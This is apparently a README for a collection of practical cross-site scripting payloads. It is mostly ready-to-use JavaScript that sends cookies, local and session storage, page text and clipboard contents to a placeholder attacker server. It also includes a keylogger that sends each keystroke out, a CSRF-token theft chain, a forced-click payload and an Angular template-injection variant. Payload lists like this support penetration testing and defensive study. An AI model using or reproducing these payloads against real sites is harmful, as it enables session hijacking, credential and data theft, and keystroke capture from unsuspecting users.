# Practical XSS Payloads
## About
Instead of using alert() for your XSS payloads, I encourage you to check out some XSS payloads which have purpose and hammer home a point.
+ **TLDR:** *POC||GTFO*

### **Quick-navigation:**
+ **EXFILTRATION:**  
  + [FETCH](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
  + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
+ **ACTIONS:**
  + [CLICK](https://github.com/Insecurities/PracticalXSSPayloads#forcing-actions)
+ **ANGULAR NOTE**
  + [PAYLOADS FOR ANGULAR](https://github.com/Insecurities/PracticalXSSPayloads#angular)

# EXFILTRATION
*For session hijacking, sensitive info exfil, etc.*
## FETCH
### GET VALUE FROM LOCAL STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $FETCH
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```
### GET COOKIES, POST $FETCH AND EXFIL RESPONSE (Good for exfiltrating data from response pages or where you might not be able to compromise cookies but leverage a CSRF token thats accessible)
```javascript
var data ={"YOUR_JSON":"SOMEVALUE"};var value=('; '+document.cookie).split(`; CSRF-TOKEN=`).pop().split(';')[0];fetch('/SENSITIVE_API_ENDPOINT',{method:'POST',headers: {'X-CSRF-Token':value,'Content-Type':'application/json;charset=utf-8',},body:JSON.stringify(data),}).then(response=>response.json()).then(data =>{fetch("https://{ATTACKER_SERVER}/key?"+JSON.stringify(data));});
```
### GET TEXT FROM PAGE AND $FETCH *(might be constrained by data length - use .slice() to shorten)*
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```
### GET CONTENT FROM CLIPBOARD AND $FETCH *(Will prompt user for Clipboard perms if not already set)*
```javascript
setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.navigator.clipboard.readText())), 1000)
```
### KEYLOGGER WITH $FETCH *(Script modified from Chentetrans logger)*
```javascript
var l = ""; document.onkeypress = function(e){;l+=e.key;fetch("https://$ATTACKER_SERVER/?q="+ l);}
```
## JQuery AJAX
### GET VALUE FROM LOCAL STORAGE AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $.GET:
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```  
### GET TEXT FROM PAGE AND $.GET *(might be constrained by data length - use .slice() to shorten)*
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
```
# FORCING ACTIONS
*For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
## CLICK ELEMENT BY ID
```javascript
document.getElementById("$TARGET_ELEMENT_ID").click()
```

# ANGULAR
For Angular template injection you should be able to use the above payloads in conjunction with constructors. You can find an example below.
### GET VALUE FROM SESSION STORAGE AND FETCH
```javascript
{{constructor.constructor('fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))')()}}
```
